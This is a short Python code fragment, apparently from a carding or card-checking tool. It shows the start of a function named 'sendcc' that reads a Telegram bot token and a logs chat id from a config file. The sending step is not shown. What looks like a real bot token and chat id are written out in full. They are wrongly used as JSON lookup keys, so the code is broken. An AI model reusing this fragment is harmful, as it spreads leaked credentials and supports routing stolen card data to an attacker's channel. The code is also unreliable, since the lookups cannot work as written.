...
async def sendcc(resp, session):
    try:
        ...
        BOT_TOKEN = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["7595971863:AAEpBqA2OGRMxxXLpNsQmhAxuVEnW464AhQ"]
        LOGS_CHAT = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["-1002197681899"]
